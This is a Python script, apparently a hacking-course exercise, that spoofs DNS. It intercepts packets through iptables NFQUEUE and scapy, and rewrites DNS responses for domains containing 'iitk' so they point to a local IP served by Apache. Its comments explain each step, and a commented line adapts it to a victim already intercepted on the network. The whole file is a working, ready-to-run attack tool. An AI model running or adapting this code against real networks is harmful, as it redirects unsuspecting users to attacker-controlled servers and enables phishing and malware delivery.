import netfilterqueue
import subprocess
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) # Wraps the packet payload into the IP layer of a scapy packet. The scapy packet will have complete info though with all layers.
    if scapy_packet.haslayer(scapy.DNSRR): # DNSRQ (DNS Question Record) for dns requests. DNSRR(DNS Resource Record) for dns responses
        #print(scapy_packet.show()) # To find out the layer in which the DNS responses are present
        #dns requests present in DNS Question Record layer, field qname
        #dns responses present in DNS Resource Record layer, field rdata
        # Can also see it as being present in the "an" field of DNS layer
        qname = scapy_packet[scapy.DNSQR].qname
        if "iitk" in str(qname):
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname = qname, rdata = "192.168.18.38") # Note that we only need to specify the fields we need to change and the ones scapy can't fill by itself. scapy smartly fills all the other missing fields.
            # Put spoof ip in the rdata field
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            # Sending just 1 answer where the original dns response packet may have multiple, so need to modify this field too
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet)) # expects a byte object
    packet.accept() # Will forward this modified packet to the target



try:
    subprocess.call("service apache2 start", shell=True)
    #subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True) # Create a modified IP table. For spoofing on a target with mac already spoofed
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True) # Create a modified IP table. For spoofing on our own computer
    queue = netfilterqueue.NetfilterQueue() # Creating an object
    queue.bind(0, process_packet) # Will bind this queue to the queue we created:  queue-num-0
    # process_packet function will be called for each packet which gets trapped in the queue
    queue.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True) # Delete the IP table we created
    print("[-] IP tables flushed")